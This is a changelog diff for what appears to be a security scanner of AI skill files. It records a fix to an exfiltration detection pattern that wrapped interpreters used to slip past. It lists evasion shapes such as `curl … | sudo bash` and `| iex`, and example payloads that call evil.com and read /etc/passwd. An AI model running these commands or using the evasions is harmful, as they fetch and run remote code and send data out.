@@ -5,6 +5,45 @@ Format follows [Keep a Changelog](https://keepachangelog.com/).
 
 ## [Unreleased]
 
+### Fixed
+
+- **The exfil sink could be walked around by wrapping the interpreter.** 8.8.1 narrowed
+  the sink so a pipe only counts when it pipes into something that executes or transmits,
+  but it required the interpreter token *flush against the pipe*. Anything in front of it
+  went straight through — and `curl … | sudo bash` is **more** dangerous than the form
+  that was caught, not less.
+
+  Two evasion families, which compose:
+
+  | shape | 8.8.1 | now |
+  | --- | --- | --- |
+  | `curl … \| sudo bash`, `\| sudo -E sh`, `\| env FOO=1 bash` | missed | caught |
+  | `curl … \| /bin/bash`, `\| /usr/bin/env sh` | missed | caught |
+  | `curl … \| iex`, `\| pwsh`, `\| powershell`, `\| php`, `\| fish`, `\| dd` | missed | caught |
+
+  A bounded wrapper chain (`sudo`/`env`/`command`/`nohup`, their flags and assignments)
+  and an optional absolute path may now precede the interpreter, and the interpreter list
+  gained the shells and runtimes it was missing. `iex` is the embarrassing one: the very
+  corpus that motivated the 8.8.1 change contained `irm … | iex` in prose.
+
+  Every quantifier in the addition is bounded and the wrapper chain is non-nullable —
+  this pattern has a ReDoS history and the widening must not reintroduce one. Verified
+  linear against adversarial wrapper/flag/assignment/path runs (~2× per doubling,
+  1.6 ms at n=2000).
+
+  **No false positives were re-opened:** re-scanning the same frozen 670-skill corpus
+  gives byte-identical stock counts — 44 total, `exfil` 6, every category ±0.
+
+  **Why it was missed:** the 8.8.1 guard assertions were derived from the same assumption
+  as the pattern — every one of them was a bare `| <interpreter>` form. A test written
+  from the same mental model as the code cannot find that model's blind spot. The new
+  guards cover the wrapper and path families explicitly.
+
+  Also recorded, since 8.8.1 only said "the backtick span is removed" without naming the
+  cost: that change gave up legacy backtick command substitution, so
+  ``curl http://evil.com/`whoami` `` and ``wget `cat /etc/passwd` …`` no longer match.
+  POSIX `$(…)` and `<(…)` still do, which is the form real payloads use.
+
 ## [8.8.1] - 2026-07-29
 
 ### Fixed
